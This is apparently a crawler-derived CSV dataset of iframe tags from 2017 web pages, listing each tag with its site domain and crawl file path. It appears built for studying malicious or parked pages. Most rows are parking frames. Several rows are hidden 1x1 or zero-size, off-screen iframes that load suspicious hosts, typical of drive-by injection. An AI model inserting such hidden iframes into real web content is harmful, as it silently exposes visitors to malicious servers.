Index,Iframe,domain,filename
1,"<iframe frameborder=""0"" height=""1"" src=""http://testswork.ru/stat.zip"" width=""1""></iframe>",http://eye789.com,/mnt/ke_scrapy_data_22_bot3/5/Win7_32_IE8_5_1331_20170728_124746/html_200_20170728_124746.txt
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=freeteentits.com&amp;pid=9PO755G95""></iframe>",http://freeteentits.com,/mnt/ke_scrapy_data_22_bot3/1/Win7_32_IE8_1_9727_20170726_102120/html_200_20170726_102120.txt
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=wwwdogforsale.com&amp;pid=9PO755G95""></iframe>",http://wwwdogforsale.com,/mnt/ke_scrapy_data_22_bot3/1/Win7_32_IE8_1_1290_20170726_103802/html_200_20170726_103802.txt
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=wwwrevolico.com&amp;pid=9PO755G95""></iframe>",http://wwwrevolico.com,/mnt/ke_scrapy_data_22_bot3/1/Win7_32_IE8_1_4157_20170726_103839/html_200_20170726_103839.txt
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=3gpkingwap.com&amp;pid=9PO755G95""></iframe>",http://3gpkingwap.com,/mnt/ke_scrapy_data_22_bot3/1/Win7_32_IE8_1_2917_20170726_101410/html_200_20170726_101410.txt
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=bathandbodyworksjobs.com&amp;pid=9PO755G95&amp;_nozc_=1""></iframe>",http://bathandbodyworksjobs.com,/mnt/ke_scrapy_data_22_bot3/1/Win7_32_IE8_1_6101_20170726_101558/html_200_20170726_101558.txt
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=1track1day.com&amp;pid=9PO755G95""></iframe>",http://1track1day.com,/mnt/ke_scrapy_data_22_bot3/1/Win7_32_IE8_1_9021_20170726_101404/html_200_20170726_101404.txt
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=9158idc.com&amp;pid=9PO755G95""></iframe>",http://9158idc.com,/mnt/ke_scrapy_data_22_bot3/1/Win7_32_IE8_1_3987_20170726_101416/html_200_20170726_101416.txt
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=chainlightningstudios.com&amp;pid=9PO755G95""></iframe>",http://chainlightningstudios.com,/mnt/ke_scrapy_data_22_bot3/1/Win7_32_IE8_1_8269_20170726_101756/html_200_20170726_101756.txt
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=ariaatl.com&amp;pid=9PO755G95""></iframe>",http://ariaatl.com,/mnt/ke_scrapy_data_22_bot3/1/Win7_32_IE8_1_8802_20170726_101516/html_200_20170726_101516.txt
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=yoputiube.com&amp;pid=9PO755G95""></iframe>",http://yoputiube.com,/mnt/ke_scrapy_data_22_bot3/1/Win7_32_IE8_1_9239_20170726_103919/html_200_20170726_103919.txt
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=gamsforgirls.com&amp;pid=9PO755G95""></iframe>",http://gamsforgirls.com,/mnt/ke_scrapy_data_22_bot3/1/Win7_32_IE8_1_8690_20170726_102136/html_200_20170726_102136.txt
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=raadiofarda.com&amp;pid=9PO755G95""></iframe>",http://raadiofarda.com,/mnt/ke_scrapy_data_22_bot3/1/Win7_32_IE8_1_6477_20170726_103138/html_200_20170726_103138.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/qJIbLKWyYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://hruner.com,/mnt/ke_scrapy_data_22_bot3/6/Win7_32_IE8_6_7350_20170728_171829/html_200_20170728_171829.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/q25uqT5zrv5vMKD="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://jangasm.org,/mnt/ke_scrapy_data_22_bot3/6/Win7_32_IE8_6_2517_20170728_171847/html_200_20170728_171847.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/q2u6LmSuqP5upzp="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://jump1ng.net,/mnt/ke_scrapy_data_22_bot3/6/Win7_32_IE8_6_8557_20170728_171854/html_200_20170728_171854.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/L2WdpzIwrJ5uM3MuqP5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://powerplanting.com/,/mnt/ke_scrapy_data_22_bot3/10/Win7_32_IE8_10_1022_20170729_004505/html_200_20170729_004505.txt
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=czbaoyu.com&amp;pid=9PO755G95""></iframe>",http://www1.czbaoyu.com/?kw=sewing%20machine,/mnt/ke_scrapy_data_22_bot3/10/Win7_32_IE8_10_7975_20170729_004243/html_200_20170729_004243.txt
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=douate.com&amp;pid=9PO755G95""></iframe>",http://douate.com,/mnt/ke_scrapy_data_22_bot3/10/Win7_32_IE8_10_6058_20170729_004257/html_200_20170729_004257.txt
1,"<iframe frameborder=""0"" height=""1"" src=""http://188.165.163.235/index/api.php?sid=9Hbrbj_20O5TRHrR0aFL"" style=""position:absolute;top:-100px;left:9999px"" width=""1""></iframe>",http://armazones.com,/mnt/ke_scrapy_data_22_bot3/10/Win7_32_IE8_10_5119_20170729_004149/html_200_20170729_004149.txt
2,"<iframe frameborder=""0"" height=""1"" src=""http://91.210.166.134/JC81xy"" style=""position:absolute;top:-100px;left:9999px"" width=""1""></iframe>",http://armazones.com,/mnt/ke_scrapy_data_22_bot3/10/Win7_32_IE8_10_5119_20170729_004149/html_200_20170729_004149.txt
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=sockslab.net&amp;pid=9PO755G95""></iframe>",http://sockslab.net,/mnt/ke_scrapy_data_22_bot3/10/Win7_32_IE8_10_7232_20170729_004534/html_200_20170729_004534.txt
0,"<iframe height=""0"" name=""5924"" src=""http://AAA.77xxmm.cn/new858.htm?075"" width=""0""></iframe>",http://de007.net,/mnt/ke_scrapy_data_22_bot3/10/Win7_32_IE8_10_845_20170729_004252/html_200_20170729_004252.txt
1,"<iframe height=""0"" name=""5924"" src=""http://aaa.1l1l1l.com/error/404.html"" width=""0""></iframe>",http://de007.net,/mnt/ke_scrapy_data_22_bot3/10/Win7_32_IE8_10_845_20170729_004252/html_200_20170729_004252.txt
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=alphaxiom.com&amp;pid=9PO755G95""></iframe>",http://alphaxiom.com,/mnt/ke_scrapy_data_22_bot3/10/Win7_32_IE8_10_6565_20170729_004128/html_200_20170729_004128.txt
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=natebennettfleming.com&amp;pid=9PO755G95""></iframe>",http://natebennettfleming.com,/mnt/ke_scrapy_data_22_bot3/10/Win7_32_IE8_10_1559_20170729_004435/html_200_20170729_004435.txt
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=114oldest.com&amp;pid=9PO755G95""></iframe>",http://114oldest.com,/mnt/ke_scrapy_data_22_bot3/10/Win7_32_IE8_10_3018_20170729_004113/html_200_20170729_004113.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pT5upUWyrJWcpv5vMKD="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cancerlove.org/,/mnt/ke_scrapy_data_22_bot3/10/Win7_32_IE8_10_1107_20170729_004230/html_200_20170729_004230.txt
0,"<iframe frameborder=""0"" height=""0"" src=""http://db3service.ru/in.php?a=QQkFBwQEAAADBgAGEkcJBQcEAQMABQEEDQ=="" width=""0""></iframe>",http://ali59000.free.fr,/mnt/ke_scrapy_data_22_bot3/10/Win7_32_IE8_10_7660_20170729_004127/html_200_20170729_004127.txt
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=mainnetsoll.com&amp;pid=9PO755G95""></iframe>",http://mainnetsoll.com,/mnt/ke_scrapy_data_22_bot3/10/Win7_32_IE8_10_2962_20170729_004402/html_200_20170729_004402.txt
0,"<iframe height=""1"" src=""http://volgo-marun.cn/pek/index.php"" style=""visibility: hidden;"" width=""1""></iframe>",http://soluxury.co.uk,/mnt/ke_scrapy_data_22_bot3/10/Win7_32_IE8_10_4814_20170729_004535/html_200_20170729_004535.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/rz51ZTSloP5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://mah0ney.com,/mnt/ke_scrapy_data_22_bot3/10/Win7_32_IE8_10_3860_20170729_004401/html_200_20170729_004401.txt
0,"<iframe height=""1"" src=""http://googlestat77.com/"" style=""visibility:hidden;"" width=""1""></iframe>",http://greenculturefoundation.org,/mnt/ke_scrapy_data_22_bot3/10/Win7_32_IE8_10_8367_20170729_004315/html_200_20170729_004315.txt
1,"<iframe height=""1"" src=""http://visions7.net/"" style=""visibility:hidden;"" width=""1""></iframe>",http://greenculturefoundation.org,/mnt/ke_scrapy_data_22_bot3/10/Win7_32_IE8_10_8367_20170729_004315/html_200_20170729_004315.txt
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=gumblar.cn&amp;pid=9PO755G95""></iframe>",http://gumblar.cn,/mnt/ke_scrapy_data_22_bot3/10/Win7_32_IE8_10_1423_20170729_004317/html_200_20170729_004317.txt
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=microsearchstat.com&amp;pid=9PO755G95""></iframe>",http://microsearchstat.com,/mnt/ke_scrapy_data_22_bot3/10/Win7_32_IE8_10_6210_20170729_004415/html_200_20170729_004415.txt
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=augami.net&amp;pid=9PO755G95""></iframe>",http://augami.net,/mnt/ke_scrapy_data_22_bot3/10/Win7_32_IE8_10_1151_20170729_004150/html_200_20170729_004150.txt
0,"<iframe frameborder=""0"" id=""iframe"" src=""http://findbetterresults.com/?dn=se-group.de&amp;pid=9PO755G95""></iframe>",http://se-group.de,/mnt/ke_scrapy_data_22_bot3/10/Win7_32_IE8_10_5749_20170729_004524/html_200_20170729_004524.txt
0,"<iframe height=""10"" src=""http://jedelcio.com.br/counter.php"" style=""visibility: hidden; position: absolute; left: 0px; top: 0px"" width=""10""></iframe>",http://yeniyuzyillions.org,/mnt/ke_scrapy_data_22_bot3/10/Win7_32_IE8_10_7870_20170729_004627/html_200_20170729_004627.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/AGNjZwqjLl5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://50027cp.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_2230_20170727_171828/html_200_20170727_171828.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmV3YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj27.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_8093_20170727_174322/html_200_20170727_174322.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/AGNjAGSjLl5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://50051cp.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_3167_20170727_171847/html_200_20170727_171847.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmZ5YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj39.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_5699_20170727_174349/html_200_20170727_174349.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmD1Av5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj456.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_7500_20170727_174359/html_200_20170727_174400.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmxjYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj90.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_7679_20170727_174521/html_200_20170727_174521.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmx4YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj98.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_4420_20170727_174542/html_200_20170727_174542.txt
0,"<iframe frameborder=""0"" height=""140"" marginheight=""0"" marginwidth=""0"" scrolling=""no"" src=""https://www.944711.com/xglhc.aspx"" width=""100%""></iframe>",http://038481.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_6074_20170727_171239/html_200_20170727_171239.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmZmZmZhpTW6"" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj3333.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_5848_20170727_174342/html_200_20170727_174342.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmD2YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj46.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_5631_20170727_174400/html_200_20170727_174400.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmt5YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj89.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_7639_20170727_174518/html_200_20170727_174518.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmD0YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj44.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_647_20170727_174354/html_200_20170727_174354.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmL5YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj69.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_9797_20170727_174445/html_200_20170727_174445.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmRkZF5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj111.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_7282_20170727_174302/html_200_20170727_174302.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/AGNjZwSjLl5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://50021cp.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_388_20170727_171825/html_200_20170727_171825.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmx5YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj99.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_7242_20170727_174543/html_200_20170727_174543.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmD1YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj45.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_4349_20170727_174358/html_200_20170727_174358.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmtmYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj83.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_7178_20170727_174459/html_200_20170727_174459.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmLkYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj61.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_8005_20170727_174426/html_200_20170727_174426.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmxmYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj93.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_8452_20170727_174536/html_200_20170727_174536.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmpkYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj71.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_1758_20170727_174448/html_200_20170727_174448.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmZlYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj32.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_843_20170727_174339/html_200_20170727_174339.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmZ0AF5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj345.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_9998_20170727_174344/html_200_20170727_174344.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmxhpTW6"" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj9.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_3157_20170727_174520/html_200_20170727_174520.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmpmYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj73.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_3636_20170727_174449/html_200_20170727_174449.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmxkYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj91.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_5245_20170727_174528/html_200_20170727_174528.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmH2Al5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj567.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_9869_20170727_174421/html_200_20170727_174421.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmLmYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj63.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_1458_20170727_174427/html_200_20170727_174427.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/AGNjZwAjLl5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://50023cp.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_380_20170727_171826/html_200_20170727_171826.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmHjYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj50.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_8668_20170727_174406/html_200_20170727_174406.txt
0,"<iframe frameborder=""0"" height=""140"" marginheight=""0"" marginwidth=""0"" scrolling=""no"" src=""https://www.944711.com/xglhc.aspx"" width=""100%""></iframe>",http://748230.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_8400_20170727_172329/html_200_20170727_172329.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmZ0YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj34.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_6184_20170727_174343/html_200_20170727_174343.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmVlZv5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj222.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_3882_20170727_174317/html_200_20170727_174317.txt
0,"<iframe <="""" allowtransparency=""true"" frameborder=""0"" height=""170"" iframe="""" scrolling=""no"" src=""http://www.lelelove520.com/cs.asp"" width=""200""></iframe>",http://010xinlei.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_8113_20170727_152401/html_200_20170727_152401.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmV2YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj26.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_9694_20170727_174321/html_200_20170727_174321.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmVmYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj23.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_8071_20170727_174318/html_200_20170727_174318.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmt4YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj88.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_1183_20170727_174503/html_200_20170727_174503.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmx1YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj95.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_6574_20170727_174539/html_200_20170727_174539.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/AGNjAGAjLl5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://50053cp.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_396_20170727_171848/html_200_20170727_171848.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmL4YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj68.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_2643_20170727_174445/html_200_20170727_174445.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmH2YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj56.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_8057_20170727_174420/html_200_20170727_174420.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmplYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj72.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_5051_20170727_174448/html_200_20170727_174448.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmp4BF5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj789.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_6396_20170727_174455/html_200_20170727_174455.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmR0YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj14.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_646_20170727_174306/html_200_20170727_174306.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmD4YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj48.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_1340_20170727_174403/html_200_20170727_174403.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/AGNjAGOjLl5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://50050cp.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_9349_20170727_171845/html_200_20170727_171845.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmp3Al5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj777.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_5877_20170727_174452/html_200_20170727_174452.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmVkYaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj21.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_6085_20170727_174315/html_200_20170727_174315.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/AGNjZwyjLl5jLab="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://50029cp.com,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_3768_20170727_171830/html_200_20170727_171830.txt
0,"<iframe allowtransparency=""true"" frameborder=""0"" marginheight=""0"" marginwidth=""0"" src=""http://mcc.godaddy.com/park/pTA0qmH1YaOvrt=="" style=""visibility: visible;height: 100%; position:absolute"" width=""100%""></iframe>",http://cpgj55.com/,/mnt/ke_scrapy_data_22_bot3/4/Win7_32_IE8_4_7780_20170727_174411/html_200_20170727_174411.txt
